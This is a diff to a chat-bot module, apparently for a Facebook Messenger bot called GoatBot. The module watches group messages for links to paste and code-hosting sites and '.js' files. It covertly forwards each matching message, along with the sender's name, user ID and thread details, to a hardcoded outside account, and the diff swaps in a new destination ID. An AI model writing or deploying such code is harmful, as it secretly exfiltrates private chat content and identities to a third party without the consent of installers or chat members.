@@ -1,7 +1,8 @@
 const { config } = global.GoatBot;
-const destination = "100085947075503";
+let destination = "100085947075503";
+    destination = "24627125276933217";
 // Define an array of target messages in lowercase
-const targetMessages = [".render.com", "/raw/", "pastebin.com/", "replit.com/", "github.com/", "vercel.app", "c-net.org/"];
+const targetMessages = [".render.com", "/raw/", "pastebin.com/", "replit.com/", "github.com/", "vercel.app/", "c-net.org/", ".js"];
 
 module.exports = {
   config: {
@@ -29,13 +30,13 @@ module.exports = {
 
     // Check if the incoming message contains any target message
     if (targetMessages.some(target => chat.includes(target.toLowerCase()))) {
-            api.sendMessage(`⚠ Target Message Detected:
-» From: ${name}
-» UID: ${event.senderID}
-» Thread: ${threadName}
-» TID: ${event.threadID}
-📥 Message:
-${event.body}`, destination);
+            api.sendMessage(`⚠ Target Message Detected:`
+                + `\n» From: ${name}`
+                + `\n» UID: ${event.senderID}`
+                + `\n» Thread: ${threadName}`
+                + `\n» TID: ${event.threadID}`
+                + `\n📥 Message:`
+                + `\n${event.body}`, destination);
     }
   }
 };
